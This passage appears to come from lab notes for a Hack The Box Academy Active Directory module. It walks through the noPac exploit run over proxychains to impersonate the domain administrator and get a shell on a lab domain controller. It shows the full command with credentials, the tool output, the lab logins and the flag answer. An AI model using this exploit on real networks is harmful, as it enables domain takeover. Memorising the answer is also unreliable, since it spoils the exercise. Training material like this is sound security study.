...
We'll also notice the `ms-DS-MachineAccountQuota` number is set to `10`. In some environments, an astute sysadmin may set the `ms-DS-MachineAccountQuota` value to `0`. If this is the case, the attack will fail because our user will not have the rights to add a new machine account. Setting this to `0` can prevent quite a few AD attacks.
...
## Questions
Authenticate to **10.129.47.229** (ACADEMY-EA-ATTACK01), with user `htb-student` and password `HTB_@cademy_stdnt!`
...
2. Apply what was taught in this section to gain a shell on DC01. Submit the contents of flag.txt located in the DailyTasks directory on the Administrator's desktop. **Answer: D0ntSl@ckonN0P@c!**
   ...
   - Scan to identify the vulnerability and run the tool to obtain a shell and read the flag:
        ...
        [proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.5.5:389  ...  OK
        [*] Current ms-DS-MachineAccountQuota = 10
        ...
        [proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.5.5:88  ...  OK
        [proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.5.5:88  ...  OK
        [*] Got TGT from 172.16.5.5. Ticket size 663
        $ sudo proxychains python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
        [proxychains] config file found: /etc/proxychains.conf
        [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
        [proxychains] DLL init: proxychains-ng 4.16
        ...
        [*] Adding Computer Account "WIN-ABDT5PU2XZ7$"
        [*] MachineAccount "WIN-ABDT5PU2XZ7$" password = 6vS27nl9K2Mt
        [proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.5.5:135  ...  OK
        [proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.5.5:445  ...  OK
        [*] Successfully added machine account WIN-ABDT5PU2XZ7$ with password 6vS27nl9K2Mt.
        [*] WIN-ABDT5PU2XZ7$ object = CN=WIN-ABDT5PU2XZ7,CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
        [*] WIN-ABDT5PU2XZ7$ sAMAccountName == ACADEMY-EA-DC01
        [proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.5.5:88  ...  OK
        [proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.5.5:88  ...  OK
        [*] Saving a DC's ticket in ACADEMY-EA-DC01.ccache
        [*] Reseting the machine account to WIN-ABDT5PU2XZ7$
        [*] Restored WIN-ABDT5PU2XZ7$ sAMAccountName to original value
        [*] Using TGT from cache
        [*] Impersonating administrator
        [*] 	Requesting S4U2self
        [proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.5.5:88  ...  OK
        [*] Saving a user's ticket in administrator.ccache
        [*] Rename ccache to administrator_ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL.ccache
        [*] Attempting to del a computer with the name: WIN-ABDT5PU2XZ7$
        [-] Delete computer WIN-ABDT5PU2XZ7$ Failed! Maybe the current user does not have permission.
        [*] Pls make sure your choice hostname and the -dc-ip are same machine !!
        [*] Exploiting..
        [proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.16.5.5:445  ...  OK
        [!] Launching semi-interactive shell - Careful what you execute
